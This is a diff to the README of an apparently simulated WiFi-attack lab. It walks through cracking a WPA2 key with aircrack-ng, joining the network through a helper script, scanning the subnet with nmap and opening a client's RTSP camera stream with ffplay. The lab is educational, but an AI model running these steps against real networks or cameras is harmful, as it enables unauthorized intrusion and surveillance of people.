@@ -78,6 +78,30 @@ sudo aircrack-ng <CAPTURE_FILE>.cap -w /usr/share/wordlists/rockyou.txt
 # KEY FOUND! [ cookie123 ]
 ```
 
+### 6. Simulate joining the network
+
+> **Note:** Actually connecting `wlan2` to the AP would break the simulated environment
+> (mac80211_hwsim doesn't handle a third associated client cleanly alongside the monitor
+> interface). Instead, run the provided helper script, which assigns the attacker's IP
+> directly on the host without going through the WPA2 association:
+
+```bash
+sudo ./connectToWifi.sh
+```
+
+### 7. Discover the target
+
+```bash
+nmap 10.133.7.0/24 -sT
+# Port 554/tcp open on 10.133.7.86 — that's the client's RTSP camera
+```
+
+### 8. Access the camera stream
+
+```bash
+ffplay -rtsp_transport tcp rtsp://10.133.7.86:554/file
+```
+
 ---
 
 ## WPA2 key in this lab
@@ -88,31 +112,25 @@ The key is: `cookie123`
 
 ## Network
 
-The AP runs a DHCP server on `10.133.7.0/24`:
+All devices use static IPs on `10.133.7.0/24`:
 
 | Device | Address |
 |---|---|
-| AP (`wlan0`) | `10.133.7.1` (static) |
-| Client (`wlan1`) | `10.133.7.100–200` (DHCP) |
-| Attacker (`wlan2`) | run `sudo dhclient wlan2` after cracking the key |
+| AP (`wlan0`) | `10.133.7.1` |
+| Client (`wlan1`) | `10.133.7.86` |
+| Attacker (host) | `10.133.7.99` (set by `connectToWifi.sh`) |
 
 ---
 
 ## RTSP video stream
 
-The client container runs an RTSP server on port `554`. Once the lab is up, the stream is reachable at:
+The client container runs an RTSP server on port `554`:
 
 ```
-rtsp://10.133.7.<CLIENT_IP>:554/file
+rtsp://10.133.7.86:554/file
 ```
 
-To replace the video, swap out the file at:
-
-```
-client/bstreamer/video/videoa.mkv
-```
-
-Then rebuild with `docker compose up --build`.
+To replace the video, swap out `client/bstreamer/video/videoa.mkv` and rebuild with `docker compose up --build`.
 
 ---
 
